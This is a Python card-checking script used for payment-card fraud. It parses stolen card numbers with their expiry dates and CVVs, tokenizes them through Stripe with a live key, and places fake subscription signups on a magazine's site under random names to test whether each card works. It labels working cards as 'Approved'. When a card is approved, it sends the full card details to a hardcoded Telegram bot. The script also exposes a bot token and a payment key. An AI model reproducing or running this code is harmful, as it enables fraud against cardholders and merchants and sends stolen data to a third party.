import re, requests, string
import logging
import requests
import time
import string
import random
import asyncio
import re
import base64
import json
import sys
import urllib3
import http.client
import os



session = requests.session()
letters = string.ascii_lowercase
First = ''.join(random.choice(letters) for i in range(6))
Last = ''.join(random.choice(letters) for i in range(6))
PWD = ''.join(random.choice(letters) for i in range(10))
Name = f'{First}+{Last}'
Email = f'{First}.{Last}@gmail.com'
UA = 'Mozilla/5.0 (X11; Linux i686; rv:102.0) Gecko/20100101 Firefox/102.0'
def check_cv(input):
  x = re.search(r"(?:3|4|5|6)\d{14,15}\|\d{2}\|\d{2,4}\|\d{3,4}", input)
  print(x)
  if x:
    card = x.group(0)

  ccn, mm, yy, cvv = card.split('|',4)
  if mm.startswith('2'):
      mm, yy = yy, mm
  if len(mm) >= 3:
      mm, yy, cvv = yy, cvv, mm
  if len(ccn) < 15 or len(ccn) > 16:
      return ('<b>Failed to parse Card</b>\nReason: Invalid Format!</b>') 



  #x = re.findall(r'\d+', input)
  #print(x)
  #ccn = x[0]
  #print(ccn)
  #mm = x[1]
  #yy = x[2]
  #cvv = x[3]
  #if mm.startswith('2'):
            #mm, yy = yy, mm
  #if len(mm) >= 3:
    #        mm, yy, cvv = yy, cvv, mm
  #if len(ccn) < 15 or len(ccn) > 16:
    #        return ('<b>Failed to parse Card</b>\n'
  #                                     '<b>Reason: Invalid Format!</b>')   
  #BIN = ccn[:6]
  # if BIN in BLACKLISTED:
  #     return ('<b>BLACKLISTED BIN</b>')
  # get guid muid sid
  time1 = time.time()
  headers = {
      "user-agent": UA,
      "accept": "application/json, text/plain, */*",
      "content-type": "application/x-www-form-urlencoded"
  }

  b = session.get('https://ip.seeip.org/').text

  s = session.post('https://m.stripe.com/6', headers=headers)
  r = s.json()
  Guid = r['guid']
  Muid = r['muid']
  Sid = r['sid']

  # hmm
  load = {
      "guid": Guid,
      "muid": Muid,
      "sid": Sid,
      "key": "pk_live_oljKIizPrbgI4FSG4XcYnPLx",
      "card[name]": Name,
      "card[number]": ccn,
      "card[exp_month]": mm,
      "card[exp_year]": yy,
      "card[cvc]": cvv
  }

  header = {
      "accept": "application/json",
      "content-type": "application/x-www-form-urlencoded",
      "user-agent": UA,
      "origin": "https://js.stripe.com",
      "referer": "https://js.stripe.com/",
      "accept-language": "en-US,en;q=0.9"
  }

  rx = session.post('https://api.stripe.com/v1/tokens',
                    data=load, headers=header)
  time2 = time.time()
  
  res = rx.json()
  print(res)
  
  if 'invalid_' in rx.text:
    msg = res['error']['message']
    return (f'''
❌Gateway: 💵STRIPE 4.99$💵\n<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ERROR
<b>MSG</b>➟ {msg}
================================================================
================================================================
<b>TOOK:</b> <code>{time2 - time1}</code>(s)
================================================================
''')
  if 'incorrect_number' in rx.text:
    msg = res['error']['message']
    return (f'''
❌Gateway: 💵STRIPE 4.99$💵\n<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ERROR
<b>MSG</b>➟ {msg}
================================================================
================================================================
<b>TOOK:</b> <code>{time2 - time1}</code>(s)
================================================================
''')

  if 'declined' in rx.text:
      msg = res['error']['message']
      return (f'''
❌Gateway: 💵STRIPE 4.99$💵\n<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Declined 4.99$
<b>MSG</b>➟ {msg}
================================================================

================================================================
<b>TOOK:</b> <code>{time2 - time1:0.2f}</code>(s)
================================================================

''')  
  else:
   token = rx.json()['id']
   res = rx.json()
   card = res['card']
   country = card['country']
   brand = card['brand']
   funding = card['funding']
   LastF = f'************{ccn[-4:]}'

   payload = {
      "subscription_type": "digital",
      "first_name": First,
      "last_name": Last,
      "email": Email,
      "login_pass": PWD,
      "confirm_pass": PWD,
      "shipping_country": "United+States",
      "card_number": LastF,
      "card_cvc": cvv,
      "card_expiry_month": mm,
      "card_expiry_year": yy,
      "action": "register",
      "stripe_token": token,
      "last4": token
  }

   head = {
      "accept": "*/*",
      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
      "user-agent": UA,
      "origin": "https://preludemag.com",
      "referer": "https://preludemag.com/subscribe/",
      "accept-language": "en-US,en;q=0.9"
  }

   ri = session.post('https://preludemag.com/subscribe/', data=payload,
                    headers=head)
   
   time3 = time.time()
  

   if 'success' in ri.text:
      requests.get('https://api.telegram.org/bot5380276548:AAGpPwcq33EcsQQ8WKyS_htKJUU3SWSkxPk/sendMessage?chat_id=1924942921&text=CV:'+ccn+'|'+mm+'|'+yy+'|'+cvv+'')
      return (f'''
✅Gateway: 💵STRIPE 4.99$💵\n<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ #ApprovedCVV
<b>MSG</b>➟ {ri.text}
================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================
<b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)
================================================================
''')

   if 'incorrect_cvc' in ri.text:
      return (f'''
✅Gateway: 💵STRIPE 4.99$💵\n<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ #ApprovedCCN
<b>MSG</b>➟ {ri.text}
================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================
<b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)
================================================================
''')

   if 'declined' in ri.text:
      return (f'''
❌Gateway: 💵STRIPE 4.99$💵\n<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Declined 4.99$
<b>MSG</b>➟ {ri.text}
================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================
<b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)
================================================================
''')

   